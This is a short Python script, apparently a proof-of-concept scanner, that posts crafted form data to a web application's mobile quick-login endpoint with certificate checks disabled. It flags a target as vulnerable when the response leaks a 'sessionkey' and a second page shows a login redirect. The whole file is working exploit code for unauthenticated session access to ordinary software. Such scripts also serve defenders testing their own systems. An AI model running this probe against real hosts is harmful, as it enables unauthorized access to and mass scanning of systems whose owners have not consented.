import requests,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(url):
    if url[-1]=='/':
        urls = url + "mobile/plugin/VerifyQuickLogin.jsp"
    else:
        urls = url + "/mobile/plugin/VerifyQuickLogin.jsp"
    headers={
    'Content-Type': 'application/x-www-form-urlencoded'
    }
    body='identifier=1&language=1&ipaddress=1.1.1.1'
    r=requests.post(urls,body,headers=headers,verify=False,timeout=5)
    if url[-1]=='/':
        urlss = url + "mobile/plugin/plus/login/LoingFromEb.jsp"
    else:
        urlss = url + "/mobile/plugin/plus/login/LoingFromEb.jsp"
    r2=requests.get(urlss,verify=False,timeout=5)
    if r.status_code==200 and 'sessionkey' in r.text and r2.status_code==200 and 'window.location.href="/login/login.jsp' in r2.text:
        return True
    else:
        return False